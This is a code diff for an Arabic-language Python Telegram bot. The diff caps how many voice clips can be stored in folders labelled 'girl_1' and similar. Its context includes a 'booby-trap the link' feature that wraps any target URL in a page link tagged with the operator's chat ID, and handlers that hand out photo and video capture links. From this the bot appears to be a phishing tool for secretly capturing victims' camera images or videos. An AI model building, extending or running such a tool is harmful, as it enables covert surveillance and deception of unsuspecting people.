@@ -92,8 +92,14 @@ def handle_query(call):
             bot.answer_callback_query(call.id, "تم إرسال المقاطع")
 
     elif call.data.startswith("add_"):
-        user_states[chat_id] = call.data # ننتظر رفع الملف
-        bot.edit_message_text("🎤 أرسل المقطع الصوتي الآن:", chat_id, call.message.message_id)
+        girl = call.data.replace("add_", "")
+        count = len(db.get(girl, []))
+        limit = 10 if girl == "girl_1" else 13
+        if count >= limit:
+            bot.answer_callback_query(call.id, f"❌ المجلد ممتلئ ({count}/{limit})")
+        else:
+            user_states[chat_id] = call.data
+            bot.edit_message_text(f"🎤 أرسل المقطع الصوتي الآن ({count}/{limit}):", chat_id, call.message.message_id)
 
     elif call.data == "inject_start":
         user_states[chat_id] = "waiting_for_inject"
@@ -106,7 +112,6 @@ def handle_query(call):
     elif call.data == "main_menu":
         bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
     
-    # باقي الروابط
     elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
     elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
     elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
@@ -118,22 +123,26 @@ def handle_messages(message):
     chat_id = message.chat.id
     state = user_states.get(chat_id)
 
-    # حفظ الصوتيات
     if state and state.startswith("add_"):
         girl = state.replace("add_", "")
         db = load_db()
-        db[girl].append(message.voice.file_id)
-        save_db(db)
-        bot.reply_to(message, "✅ تم حفظ المقطع بنجاح!")
-        user_states[chat_id] = None
+        limit = 10 if girl == "girl_1" else 13
+        
+        if len(db[girl]) < limit:
+            db[girl].append(message.voice.file_id)
+            save_db(db)
+            current = len(db[girl])
+            bot.reply_to(message, f"✅ تم الحفظ! المجلد يحتوي الآن على ({current}/{limit})")
+            if current >= limit: user_states[chat_id] = None
+        else:
+            bot.reply_to(message, "❌ المجلد ممتلئ بالفعل!")
+            user_states[chat_id] = None
 
-    # تلغيم الرابط
     elif state == "waiting_for_inject":
         target = message.text if message.text.startswith("http") else f"https://{message.text}"
         bot.reply_to(message, f"✅ تم التلغيم:\n{PHOTO_PAGE_URL}?target={target}&chatId={chat_id}")
         user_states[chat_id] = None
 
-    # تحميل الفيديوهات
     elif state == "waiting_for_url":
         status_msg = bot.reply_to(message, "⏳ جاري التحميل... يرجى الانتظار")
         path, title = download_video_sync(message.text, chat_id)
